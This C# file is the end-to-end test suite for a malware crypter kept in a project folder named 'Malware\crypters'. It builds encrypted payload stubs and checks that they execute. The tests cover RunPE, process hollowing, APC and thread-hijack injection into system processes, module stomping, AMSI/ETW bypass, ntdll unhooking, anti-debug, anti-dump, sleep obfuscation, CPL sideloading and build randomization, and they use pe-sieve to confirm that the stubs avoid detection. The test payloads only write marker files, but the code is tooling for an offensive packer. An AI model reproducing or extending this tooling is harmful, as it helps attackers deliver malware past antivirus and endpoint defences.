using System;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Security.Cryptography;
using System.Security.Principal;
using XanthoroxCrypted.Core;

// ═══════════════════════════════════════════════════════════
//  Extended E2E Test Suite — Ciphers & Execution Methods
//  NOTE: Fibers / CallbackProxy / ModuleStomp execute raw shellcode
//  (VirtualAlloc RWX + direct call), NOT PE .exe files.
//  These execution methods require position-independent shellcode
//  payloads and are SKIPPED when testing with a PE payload.
//
//  Remote Injection tests require admin privileges (injection into
//  system processes like explorer.exe/svchost.exe needs PROCESS_VM_WRITE).
//  They are SKIPPED when not running elevated.
// ═══════════════════════════════════════════════════════════

string stubDir = @"D:\Development\projects\Malware\crypters\Xen-OFCrypt";
string outDir = Path.Combine(stubDir, "build", "out");
string stubPath = Path.Combine(outDir, "stub.exe");
string payloadPath = Path.Combine(stubDir, "build", "e2e_test", "bin", "test_payload_simple.exe");
string shellcodePath = Path.Combine(stubDir, "build", "e2e_test", "shellcode", "sc_test.bin");
string dotnetPayloadPath = Path.Combine(stubDir, "build", "e2e_test", "dotnet_payload", "bin", "Release", "net48", "dotnet_payload.exe");
string markerPath = @"C:\temp\runpe_marker.txt";
string scMarkerPath = @"C:\temp\sc_marker.txt";
string dotnetMarkerPath = @"C:\temp\dotnet_marker.txt";

if (!File.Exists(stubPath)) { Console.WriteLine("[FAIL] stub.exe not found"); return; }
if (!File.Exists(payloadPath)) { Console.WriteLine("[FAIL] test_payload_simple.exe not found"); return; }

byte[] rawPayload = File.ReadAllBytes(payloadPath);
byte[] stubTemplate = File.ReadAllBytes(stubPath);
byte[] rawDotNetPayload = File.Exists(dotnetPayloadPath) ? File.ReadAllBytes(dotnetPayloadPath) : null;
Console.WriteLine($"  [DBG] dotnetPayloadPath={dotnetPayloadPath} exists={File.Exists(dotnetPayloadPath)} size={rawDotNetPayload?.Length ?? 0}");

int totalTests = 0, passed = 0, failed = 0, skipped = 0;
bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent())
    .IsInRole(WindowsBuiltInRole.Administrator);

// ── Test runner ──
void RunTest(string name, BuildConfig config, CipherType cipher, bool requireAdmin = false)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    if (requireAdmin && !isAdmin)
    {
        Console.WriteLine("SKIP (needs admin)");
        skipped++;
        return;
    }

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawPayload, key, cipher);

    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    if (File.Exists(markerPath)) File.Delete(markerPath);
    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    Thread.Sleep(200);

    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    bool found = false;
    for (int i = 0; i < 8; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(markerPath))
        {
            string content = File.ReadAllText(markerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s)");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    if (File.Exists(markerPath)) File.Delete(markerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

// ═══════════════════════════════════════════════════════════
//  Shellcode Test Runner — for Fibers/CallbackProxy/ModuleStomp
//  These modes execute raw position-independent shellcode,
//  NOT PE .exe files. The marker is at C:\temp\sc_marker.txt.
// ═══════════════════════════════════════════════════════════

byte[] rawShellcode = null;
if (File.Exists(shellcodePath))
    rawShellcode = File.ReadAllBytes(shellcodePath);

void RunShellcodeTest(string name, BuildConfig config, CipherType cipher, int extraWaitS = 0, bool requireAdmin = false)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    if (requireAdmin && !isAdmin)
    {
        Console.WriteLine("SKIP (needs admin)");
        skipped++;
        return;
    }

    if (rawShellcode == null)
    {
        Console.WriteLine("SKIP (no sc_test.bin)");
        skipped++;
        return;
    }

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawShellcode, key, cipher);

    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    Thread.Sleep(200);

    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    // EkkoSleep adds ~8s delay before payload execution
    int maxLoops = 8 + (extraWaitS / 2);
    bool found = false;
    for (int i = 0; i < maxLoops; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(scMarkerPath))
        {
            string content = File.ReadAllText(scMarkerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s) [{content.Trim()}]");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

// ═══════════════════════════════════════════════════════════
//  Cipher Tests — RunPE + each cipher algorithm
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Cipher Tests (RunPE + each algorithm) ──\n");

RunTest("RunPE + XOR + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunTest("RunPE + RC4 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 2, IndirectSyscalls = true, StackSpoof = true },
    CipherType.RC4);

RunTest("RunPE + AES-256 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 0, IndirectSyscalls = true, StackSpoof = true },
    CipherType.AES256);

RunTest("RunPE + ChaCha20 + IndirectSyscalls",
    new BuildConfig { RunPE = true, EncAlgorithm = 1, IndirectSyscalls = true, StackSpoof = true },
    CipherType.ChaCha20);

// ═══════════════════════════════════════════════════════════
//  Execution Method Tests — Note on shellcode-only methods
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Execution Method Tests ──\n");

// Fibers / CallbackProxy / ModuleStomp — use raw shellcode payload
RunShellcodeTest("Fibers + XOR + IndirectSyscalls",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunShellcodeTest("CallbackProxy + XOR",
    new BuildConfig { CallbackDiv = true, EncAlgorithm = 3 },
    CipherType.XOR);

RunShellcodeTest("ModuleStomp + XOR + IndirectSyscalls",
    new BuildConfig { ModuleStomp = true, EncAlgorithm = 3, IndirectSyscalls = true },
    CipherType.XOR);

// RunPE with all cipher algorithms (already tested above, but
// add AES/RC4/ChaCha without IndirectSyscalls for coverage)
RunTest("RunPE + AES-256 (no syscalls)",
    new BuildConfig { RunPE = true, EncAlgorithm = 0 },
    CipherType.AES256);

RunTest("RunPE + ChaCha20 (no syscalls)",
    new BuildConfig { RunPE = true, EncAlgorithm = 1 },
    CipherType.ChaCha20);

// ═══════════════════════════════════════════════════════════
//  Feature Toggle Tests
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Feature Toggle Tests ──\n");

RunTest("RunPE + XOR + PatchlessAmsiEtw",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, PatchlessAmsiEtw = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + AntiDebug",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, AntiDebug = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + KnownDllsUnhook",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, KnownDllsUnhook = true, IndirectSyscalls = true },
    CipherType.XOR);

RunTest("RunPE + XOR + AntiDump",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, AntiDump = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

// ═══════════════════════════════════════════════════════════
//  Long-Lived AntiDump Tests (all 4 layers active)
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Long-Lived AntiDump Tests ──\n");

RunShellcodeTest("Fibers + XOR + AntiDump",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, AntiDump = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunShellcodeTest("CallbackProxy + XOR + AntiDump",
    new BuildConfig { CallbackDiv = true, EncAlgorithm = 3, AntiDump = true },
    CipherType.XOR);

// ═══════════════════════════════════════════════════════════
//  Ekko Sleep Obfuscation Tests
//  EkkoSleep encrypts all executable memory + heap during the
//  initial delay (anti-sandbox sleep). Only works with long-lived
//  execution modes (Fibers/CallbackProxy), not RunPE.
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Ekko Sleep Obfuscation Tests ──\n");

RunShellcodeTest("Fibers + XOR + EkkoSleep",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, EkkoSleep = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    extraWaitS: 16);  // EkkoSleep = 8s jittered + 15s safety timeout + payload startup

RunShellcodeTest("CallbackProxy + XOR + EkkoSleep",
    new BuildConfig { CallbackDiv = true, EncAlgorithm = 3, EkkoSleep = true },
    CipherType.XOR,
    extraWaitS: 16);

// ═══════════════════════════════════════════════════════════
//  Sideload Delivery Format Tests (M4)
//  Tests DLL-based sideload formats: CPL, XLL
//  MSI not tested via E2E (requires msiexec infrastructure).
//  HTA/JS/VBS wrappers not tested (require WScript/mshta host).
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Sideload Delivery Format Tests ──\n");

// Test CPL format: stub built as DLL with CPlApplet export,
// launched via control.exe <path>.dll
void RunSideloadDllTest(string name, BuildConfig config, CipherType cipher, string hostExe)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.cpl");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawPayload, key, cipher);

    // Load stub.dll template for sideload formats
    string stubDllPath = Path.Combine(outDir, "stub.dll");
    if (!File.Exists(stubDllPath))
    {
        Console.WriteLine("SKIP (no stub.dll)");
        skipped++;
        return;
    }
    byte[] dllTemplate = File.ReadAllBytes(stubDllPath);

    string error = StubPatcher.Build(dllTemplate, outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    if (File.Exists(markerPath)) File.Delete(markerPath);
    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    Thread.Sleep(200);

    // Launch via host process (control.exe for CPL, etc.)
    var proc = Process.Start(new ProcessStartInfo(hostExe, outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    bool found = false;
    for (int i = 0; i < 8; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(markerPath))
        {
            string content = File.ReadAllText(markerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s)");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
    foreach (var p in Process.GetProcessesByName("control")) try { p.Kill(); } catch {}
    if (File.Exists(markerPath)) File.Delete(markerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

RunSideloadDllTest("CPL + RunPE + XOR",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, SideloadFormat = true, SideloadFormatType = 1, IndirectSyscalls = true },
    CipherType.XOR,
    @"C:\Windows\System32\control.exe");

// ═══════════════════════════════════════════════════════════
//  Build Randomization Tests (M4)
//  Verifies that BuildRandomization flag produces working
//  payloads with randomized pipeline, entry point jitter,
//  varied section names, and extra junk code layers.
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── Build Randomization Tests ──\n");

RunTest("RunPE + XOR + BuildRandomization",
    new BuildConfig { RunPE = true, EncAlgorithm = 3, BuildRandomization = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunShellcodeTest("Fibers + XOR + BuildRandomization",
    new BuildConfig { Fibers = true, EncAlgorithm = 3, BuildRandomization = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

// Run twice with same settings — each build should produce different binary
// (different seed per build) but both should execute successfully
RunTest("RunPE + AES + BuildRandomization (2nd build)",
    new BuildConfig { RunPE = true, EncAlgorithm = 0, BuildRandomization = true },
    CipherType.AES256);

// ═══════════════════════════════════════════════════════════════
//  Remote Injection Method Tests (M3)
//  Injection methods 0,1,2,4 inject shellcode into a remote
//  process (explorer.exe/svchost.exe/dllhost.exe).
//  Method 3 (ProcessHollowingPlus) creates its own process and
//  writes a PE payload — requires a PE .exe, not shellcode.
//
//  ALL injection methods require admin privileges because:
//  - Methods 0,1,2,4: OpenProcess(PROCESS_VM_WRITE) on system procs
//  - Method 3: CreateProcess(svchost.exe SUSPENDED) with full access
//  Without elevation, tests are SKIPPED.
// ═══════════════════════════════════════════════════════════════
Console.WriteLine("\n── Remote Injection Method Tests ──\n");

if (!isAdmin)
{
    Console.WriteLine("  ⚠ Not running as Administrator — injection tests SKIPPED.");
    Console.WriteLine("  ⚠ Re-run with: powershell -Command \"Start-Process cmd -Verb RunAs\"");
    Console.WriteLine();
}

// Method 0: Section Mapping — NtCreateSection + dual NtMapViewOfSection + NtCreateThreadEx
RunShellcodeTest("Injection: SectionMapping + XOR",
    new BuildConfig { RemoteInjection = true, InjectionMethod = 0, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    requireAdmin: true);

// Method 1: APC Injection — NtAllocateVirtualMemory + NtWriteVirtualMemory + NtQueueApcThread
RunShellcodeTest("Injection: APC + XOR",
    new BuildConfig { RemoteInjection = true, InjectionMethod = 1, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    requireAdmin: true);

// Method 2: Thread Hijacking — NtSuspendThread + NtGetContextThread + NtSetContextThread + NtResumeThread
RunShellcodeTest("Injection: ThreadHijack + XOR",
    new BuildConfig { RemoteInjection = true, InjectionMethod = 2, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    requireAdmin: true);

// Method 3: Process Hollowing+ — Creates own svchost.exe, hollows, writes PE payload
// Unlike other injection methods, this one expects a PE .exe payload (not shellcode)
RunTest("Injection: ProcessHollowPlus + XOR",
    new BuildConfig { RemoteInjection = true, InjectionMethod = 3, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    requireAdmin: true);

// Method 4: Callback Enum — NtAllocateVirtualMemory + NtWriteVirtualMemory + NtCreateThreadEx
RunShellcodeTest("Injection: CallbackEnum + XOR",
    new BuildConfig { RemoteInjection = true, InjectionMethod = 4, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR,
    requireAdmin: true);

// ═══════════════════════════════════════════════════════════════
//  .NET Assembly Loading Tests (M3)
//  DotNetLoader detects .NET assemblies by COM_DESCRIPTOR header,
//  writes to temp file, calls ExecuteInDefaultAppDomain(Program.Main),
//  then deletes temp file via NtDeleteFile.
//  The .NET payload class is: Program.Main(string) → writes marker.
// ═══════════════════════════════════════════════════════════════
Console.WriteLine("\n── .NET Assembly Loading Tests ──\n");

void RunDotNetTest(string name, BuildConfig config, CipherType cipher)
{
    totalTests++;
    Console.Write($"  [{totalTests}] {name,-45} ");

    if (rawDotNetPayload == null)
    {
        Console.WriteLine("SKIP (no dotnet_payload.exe)");
        skipped++;
        return;
    }

    string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
    byte[] key = RandomNumberGenerator.GetBytes(32);
    byte[] encrypted = CryptoEngine.Encrypt(rawDotNetPayload, key, cipher);

    string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
    if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; return; }

    // DEBUG: verify encrypted size and original MZ header
    {
        bool mzOk = rawDotNetPayload.Length >= 2 && rawDotNetPayload[0] == 0x4D && rawDotNetPayload[1] == 0x5A;
        Console.WriteLine($"\n  [DBG] Raw={rawDotNetPayload.Length} Enc={encrypted.Length} MZ={mzOk} First4={rawDotNetPayload[0]:X2}{rawDotNetPayload[1]:X2}{rawDotNetPayload[2]:X2}{rawDotNetPayload[3]:X2}");
    }
    {
        byte[] builtData = File.ReadAllBytes(outputPath);
        int markerIdx = -1;
        for (int b = 0; b < builtData.Length - 7; b++)
        {
            bool m = true;
            for (int c = 0; c < 7; c++) if (builtData[b + c] != (byte)"XCONFIG"[c]) { m = false; break; }
            if (m) { markerIdx = b; break; }
        }
        if (markerIdx >= 0)
        {
            int cfgOff = markerIdx + 8;
            Console.WriteLine($"\n  [DBG] XCONFIG@{markerIdx}: DotNetLoad={builtData[cfgOff+27]} RunPE={builtData[cfgOff+6]} Fibers={builtData[cfgOff+5]} EncAlgo={builtData[cfgOff+37]}");
        }
        else Console.WriteLine("\n  [DBG] XCONFIG not found in built file!");
    }

    if (File.Exists(dotnetMarkerPath)) File.Delete(dotnetMarkerPath);
    Thread.Sleep(200);

    var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
    if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; return; }

    bool found = false;
    for (int i = 0; i < 10; i++)
    {
        Thread.Sleep(2000);
        if (File.Exists(dotnetMarkerPath))
        {
            string content = File.ReadAllText(dotnetMarkerPath);
            Console.WriteLine($"PASS ({(i + 1) * 2}s) [{content.Trim()}]");
            found = true;
            break;
        }
    }

    if (!found)
    {
        bool stillRunning = true;
        try { Process.GetProcessById(proc.Id); } catch { stillRunning = false; }
        proc.WaitForExit(1000);
        string detail = stillRunning ? "still running" : $"exit={proc.ExitCode}";
        Console.WriteLine($"FAIL (no marker, {detail})");
    }

    if (File.Exists(dotnetMarkerPath)) File.Delete(dotnetMarkerPath);
    try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}

    if (found) passed++; else failed++;
}

// Minimal test: DotNetLoading only, no other evasion features
RunDotNetTest("DotNetLoad + XOR (minimal)",
    new BuildConfig { DotNetLoading = true, EncAlgorithm = 3 },
    CipherType.XOR);

RunDotNetTest("DotNetLoad + XOR + PatchlessAmsiEtw",
    new BuildConfig { DotNetLoading = true, EncAlgorithm = 3, PatchlessAmsiEtw = true, IndirectSyscalls = true, StackSpoof = true },
    CipherType.XOR);

RunDotNetTest("DotNetLoad + AES + PatchlessAmsiEtw",
    new BuildConfig { DotNetLoading = true, EncAlgorithm = 0, PatchlessAmsiEtw = true, IndirectSyscalls = true },
    CipherType.AES256);

// ═══════════════════════════════════════════════════════════
//  PE-sieve Image Classification Test (M2)
//  Verifies that Phantom DLL hollowed regions appear as
//  Image-backed (not Private/unbacked) to pe-sieve.
//  pe-sieve64.exe must be present in build/out/ directory.
// ═══════════════════════════════════════════════════════════
Console.WriteLine("\n── PE-sieve Image Classification Test ──\n");

{
    string peSievePath = Path.Combine(outDir, "pe-sieve64.exe");
    if (!File.Exists(peSievePath))
    {
        Console.WriteLine("  SKIP (pe-sieve64.exe not found in build/out/)");
        skipped++;
    }
    else if (rawShellcode == null)
    {
        Console.WriteLine("  SKIP (no sc_test.bin for PhantomDLL test)");
        skipped++;
    }
    else if (!isAdmin)
    {
        Console.WriteLine("  SKIP (needs admin for pe-sieve process inspection)");
        skipped++;
    }
    else
    {
        totalTests++;
        Console.Write($"  [{totalTests}] {\"PhantomDLL + pe-sieve Image-backed\",-45} ");

        string outputPath = Path.Combine(outDir, $"e2e_test_{totalTests}.exe");
        byte[] key = RandomNumberGenerator.GetBytes(32);
        byte[] encrypted = CryptoEngine.Encrypt(rawShellcode, key, CipherType.XOR);

        var config = new BuildConfig { PhantomDLL = true, EncAlgorithm = 3, IndirectSyscalls = true, StackSpoof = true };
        string error = StubPatcher.Build((byte[])stubTemplate.Clone(), outputPath, encrypted, key, config);
        if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"BUILD FAIL: {error}"); failed++; goto pesieve_done; }

        if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
        Thread.Sleep(200);

        var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });
        if (proc == null) { Console.WriteLine("LAUNCH FAIL"); failed++; goto pesieve_done; }

        // Wait for payload to execute and establish Phantom DLL
        bool payloadExecuted = false;
        for (int i = 0; i < 10; i++)
        {
            Thread.Sleep(2000);
            if (File.Exists(scMarkerPath))
            {
                payloadExecuted = true;
                break;
            }
        }

        if (!payloadExecuted)
        {
            Console.WriteLine("FAIL (payload didn't execute for pe-sieve scan)");
            try { proc.Kill(); } catch {}
            failed++;
            goto pesieve_done;
        }

        // Run pe-sieve against the process
        string sieveDir = Path.Combine(outDir, "pesieve_out");
        if (Directory.Exists(sieveDir)) Directory.Delete(sieveDir, true);
        Directory.CreateDirectory(sieveDir);

        var sieveProc = Process.Start(new ProcessStartInfo
        {
            FileName = peSievePath,
            Arguments = $"/pid {proc.Id} /quiet /dir \"{sieveDir}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        });

        if (sieveProc == null)
        {
            Console.WriteLine("FAIL (pe-sieve launch failed)");
            try { proc.Kill(); } catch {}
            failed++;
            goto pesieve_done;
        }

        string sieveOutput = sieveProc.StandardOutput.ReadToEnd();
        sieveProc.WaitForExit(30000);

        // Parse pe-sieve output for suspicious vs image-backed regions
        // pe-sieve exit code: 0 = no suspicious, 1 = suspicious found
        // We want NO suspicious regions for Phantom DLL areas (they should appear as Image-backed)
        bool hasSuspicious = sieveProc.ExitCode == 1;

        // Also check the reports directory for .tag files
        var tagFiles = Directory.GetFiles(sieveDir, "*.tag", SearchOption.AllDirectories);
        var suspiciousTags = tagFiles.Where(f =>
        {
            string content = File.ReadAllText(f);
            return content.Contains("suspicious") || content.Contains("patched") || content.Contains("unbacked");
        }).ToList();

        // Check for Image-backed indicators in pe-sieve output
        bool hasImageBacked = sieveOutput.Contains("Image") || tagFiles.Any(f =>
        {
            string content = File.ReadAllText(f);
            return content.Contains("Image") && !content.Contains("suspicious");
        });

        // Phantom DLL regions should NOT be flagged as suspicious
        // If pe-sieve finds no suspicious regions → PASS (Phantom DLL looks legitimate)
        // If pe-sieve finds suspicious but also Image-backed → partial pass
        if (!hasSuspicious)
        {
            Console.WriteLine("PASS (pe-sieve: no suspicious regions)");
            passed++;
        }
        else if (hasImageBacked && suspiciousTags.Count == 0)
        {
            Console.WriteLine("PASS (pe-sieve: regions Image-backed, no unbacked)");
            passed++;
        }
        else
        {
            Console.WriteLine($"FAIL (pe-sieve found {suspiciousTags.Count} suspicious regions)");
            failed++;
        }

        try { proc.Kill(); } catch {}
        if (File.Exists(scMarkerPath)) File.Delete(scMarkerPath);
        try { if (File.Exists(outputPath)) File.Delete(outputPath); } catch {}
        try { if (Directory.Exists(sieveDir)) Directory.Delete(sieveDir, true); } catch {}
    }

    pesieve_done:;
}

// ═══════════════════════════════════════════════════════════
//  Summary
// ═══════════════════════════════════════════════════════════
Console.WriteLine($"\n{'═',-60}");
Console.WriteLine($"  E2E Results: {passed}/{totalTests} PASSED, {failed} FAILED, {skipped} SKIPPED");
Console.WriteLine($"{'═',-60}");

if (skipped > 0 && !isAdmin)
    Console.WriteLine($"  TIP: {skipped} injection tests require admin. Run elevated:\n        cd build\\e2e_test && dotnet run -c Release  (from admin terminal)");

if (failed > 0)
    Environment.ExitCode = 1;
